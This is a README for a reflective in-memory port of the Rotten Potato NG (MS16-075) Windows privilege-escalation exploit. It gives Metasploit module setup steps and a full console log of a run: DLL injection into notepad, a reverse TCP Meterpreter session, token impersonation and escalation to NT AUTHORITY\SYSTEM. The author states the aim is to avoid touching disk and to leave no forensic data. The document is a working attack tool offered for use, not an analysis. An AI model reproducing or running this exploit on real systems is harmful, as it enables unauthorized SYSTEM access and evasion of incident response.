*This is a first draft and is subject to change by the end of the week. I'm aware of the bugs and plan on fixing them ASAP to make it more adaptable to certain situations.*

# About

A small project to port Rotten Potato NG for Reflection to avoid touching the disk and keep the entire attack in memory. Solves the problem of permissions issue and removes the need to leave forensic data. I prefer reflection of all things, which is why I chose to do this. Its a wonderful exploit to elevate from a service if you have the right privileges that is. And lukily, its unpatched :)

## Setup
As of late, the exploit will only work with the Metasploit framework due to an annoying issue with the thread not running as SYSTEM. Will be patched this week .

**Metasploit**

Grab the [Metasploit](ms16_075_reflection.rb) module, place it within the `~/.msf4/modules/exploits/windows/local/ms16_075_relection.rb`, and drop both the x86 & x64 DLL's within the same directory. 

Once you've achieved a shell of some sort, and the user you are running / impersonate as has the SeImpersonate privilege, run the module with your chosen payload. 

**Please Note: If you have an x86 session, but the computer is x64 , it will injection the x64 DLL. will fix ASAP. So as of now, just migrate to an x64 session so it cna inject the x64 DLL into x64 process. Havent quite figured this one out**

```msf exploit(windows/local/ms16_075_reflection) > run

[*] Started reverse TCP handler on -snip-:31334
[*] Launching notepad to host the exploit...
[+] Process 3448 launched.
[*] Reflectively injecting the exploit DLL into 3448...
[*] Injecting exploit into 3448...
[*] Exploit injected. Injecting payload into 3448...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (206403 bytes) to -snip-
[*] Meterpreter session 16 opened (-snip-:31334 -> -snip-:52436) at 2018-07-24 09:52:58 -0400

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getsystem -t 1
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
